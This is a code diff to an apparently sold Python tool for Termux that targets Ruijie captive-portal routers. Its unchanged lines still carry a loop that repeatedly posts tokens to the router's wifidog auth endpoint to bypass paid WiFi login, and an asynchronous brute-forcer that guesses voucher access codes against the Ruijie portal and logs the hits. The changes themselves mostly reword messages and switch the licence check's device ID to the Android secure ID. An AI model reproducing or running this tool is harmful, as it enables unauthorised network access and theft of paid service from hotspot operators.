@@ -38,18 +38,18 @@ def Line():
     print(f"{y}─" * os.get_terminal_size()[0])
 
 def get_hwid():
-    """Generating a Permanent Fixed HWID using Device Props"""
+    """Android Settings ကနေ ပုံသေ Android ID ကို ရယူခြင်း (Stable ID)"""
     try:
-        # ဖုန်းရဲ့ Hardware အချက်အလက်များကို ရယူခြင်း
-        model = os.popen('getprop ro.product.model').read().strip()
-        brand = os.popen('getprop ro.product.brand').read().strip()
-        node = str(uuid.getnode())
-        # Fixed Data များကို ပေါင်းပြီး MD5 Hash လုပ်ခြင်း
-        raw_id = f"{brand}-{model}-{node}"
-        return hashlib.md5(raw_id.encode()).hexdigest().upper()
+        # Termux မှာ အငြိမ်ဆုံးဖြစ်တဲ့ Secure Android ID ကို ယူပါတယ်
+        cmd = "settings get secure android_id"
+        android_id = subprocess.check_output(cmd, shell=True).decode().strip()
+        if android_id and android_id != "null":
+            return hashlib.md5(android_id.encode()).hexdigest().upper()
     except:
-        # Error တက်ခဲ့ရင် UUID ကို အသေသုံးခြင်း
-        return hashlib.md5(str(uuid.getnode()).encode()).hexdigest().upper()
+        pass
+    # အကယ်၍ Android ID မရခဲ့ရင် Hardware Node ကို သုံးပါမယ်
+    node = str(uuid.getnode())
+    return hashlib.md5(node.encode()).hexdigest().upper()
 
 def Logo():
     clear()
@@ -68,15 +68,15 @@ def Logo():
     print(logo)
     Line()
     print(f"{g}  [👤] {w}Dev      : {y}@moeyu")
-    print(f"{g}  [🆔] {w}Your ID  : {c}{get_hwid()}")
+    print(f"{g}  [🆔] {w}Fixed ID : {c}{get_hwid()}")
     print(f"{g}  [🛡️] {w}Target   : {r}Ruijie Router Only")
     Line()
 
 def check_key():
-    """Permanent License & Expiry validation"""
+    """Permanent License & Expiry System"""
     my_id = get_hwid()
     Logo()
-    print(f"{y}[*] Verifying Permanent License...{w}")
+    print(f"{y}[*] Verifying Stable License...{w}")
     try:
         res = requests.get(KEY_URL, timeout=15)
         if res.status_code == 200:
@@ -90,24 +90,24 @@ def check_key():
                         
                         if today <= expiry:
                             days_left = (expiry - today).days
-                            print(f"{g}[+] License Authorized! ({days_left} days left){w}")
+                            print(f"{g}[+] Access Granted! ({days_left} days remaining){w}")
                             time.sleep(1.5)
                             return True
                         else:
-                            print(f"{r}[!] LICENSE EXPIRED! (Expired on: {exp_str}){w}")
-                            print(f"{y}[>] Contact @moeyu to renew.")
+                            print(f"{r}[!] LICENSE EXPIRED ON {exp_str}!{w}")
+                            print(f"{y}[>] Contact @moeyu to renew your key.")
                             sys.exit()
             
             print(f"{r}[!] UNREGISTERED DEVICE!{w}")
-            print(f"{y}[>] Your Fixed ID: {c}{my_id}{w}")
-            print(f"{y}[>] Send this ID to Admin @moeyu.")
+            print(f"{y}[>] Fixed ID: {c}{my_id}{w}")
+            print(f"{y}[>] Send this ID to Admin Moe Yu.")
             sys.exit()
     except:
-        print(f"{r}[!] Database Connection Failed!{w}")
+        print(f"{r}[!] Database Connection Error!{w}")
         sys.exit()
 
 async def get_session_id(session, session_url, prev_id):
-    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
+    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
     try:
         async with session.get(session_url, headers=headers, timeout=5) as req:
             return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
@@ -121,7 +121,7 @@ class InternetAccess:
 
     async def execute(self):
         Logo()
-        print(f"{y}[*] Running Permanent Bypass Loop...{w}")
+        print(f"{y}[*] Running Background Bypass Loop...{w}")
         async with aiohttp.ClientSession() as session:
             loop_idx = 0
             while True:
@@ -131,7 +131,7 @@ class InternetAccess:
                     async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as res:
                         p = await asyncio.to_thread(ping3.ping, 'google.com')
                         p_fmt = f"{g}{int(p*1000)}ms" if p else f"{r}Timeout"
-                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] {y}Status: {res.status} {w}| Ping: {p_fmt}")
+                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass Active {w}| Ping: {p_fmt}")
                 except: pass
                 await asyncio.sleep(1)
                 loop_idx += 1
@@ -144,7 +144,7 @@ class VoucherCode:
 
     async def start(self):
         Logo()
-        print(f"{g}[+] Bruteforce Engine: {self.mode.upper()}{w}")
+        print(f"{g}[+] Bruteforce Starting... Mode: {self.mode}{w}")
         Line()
         async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.speed)) as session:
             loop_idx = 0
@@ -155,7 +155,7 @@ class VoucherCode:
                 try:
                     async with session.post(url, json={"accessCode": v, "sessionId": sid, "apiVersion": 1}) as req:
                         if 'logonUrl' in await req.text():
-                            print(f"{g}[+] FOUND: {v}{w}")
+                            print(f"{g}[+] SUCCESS FOUND: {v}{w}")
                             with open("success.txt", "a") as f: f.write(f"{v}\n")
                 except: pass
                 loop_idx += 1
@@ -177,8 +177,8 @@ def feature():
             sid_url = "https://portal-as.ruijienetworks.com" + re.search("href='(.*?)'</script>", portal).group(1)
             with open(".session_url", "w") as f: f.write(sid_url)
             with open(".ip", "w") as f: f.write(gw)
-            print(f"{g}[+] Setup Success! Your ID is now Fixed.{w}")
-        except: print(f"{r}[!] Connection Failed.")
+            print(f"{g}[+] Setup Success! Your ID is now Permanent.{w}")
+        except: print(f"{r}[!] Connection Failed. Connect to WiFi.")
     elif args.option == "internet":
         asyncio.run(InternetAccess().execute())
     elif args.option == "code":
@@ -187,4 +187,4 @@ def feature():
 if __name__ == "__main__":
     if check_key():
         try: feature()
-        except KeyboardInterrupt: print(f"\n{r}[!] Stopped.{w}")
+        except KeyboardInterrupt: print(f"\n{r}[!] Tool Stopped.{w}")
